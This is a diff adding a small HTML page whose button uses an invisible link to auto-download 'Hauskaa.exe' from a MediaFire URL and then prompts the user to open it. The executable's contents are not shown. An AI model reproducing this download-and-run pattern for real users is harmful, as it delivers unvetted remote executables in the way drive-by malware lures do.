@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download and Run</title>
+    <script>
+        function downloadAndRun() {
+            // Step 1: Create an invisible link to download the file
+            var link = document.createElement("a");
+            link.href = "https://download1321.mediafire.com/laaco1xi21igmRkjQG0Ksazjj_ksDLchyHUvnXs7PQzXw_RzS_lH34SAwhGcBINMUN-BuPlx_RSjLL0fMLPV8tZtkTF45xWpaKhrxGwhUWS-eIMEO0irgLWd3aQJUUwEsmiJ2cRPegFjnB-4PrQrCLDf-KTzhfyWKA9IspibyHv4wcNn/aintdjw0ftycea5/Hauskaa.exe";
+            link.download = "Hauskaa.exe";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Step 2: Notify the user to run the file
+            setTimeout(function() {
+                alert("After downloading, please open 'Hauskaa.exe' to start.");
+            }, 1000);
+        }
+    </script>
+</head>
+<body>
+    <h2>Download and Run My Program</h2>
+    <button onclick="downloadAndRun()">Download & Run</button>
+</body>
+</html>
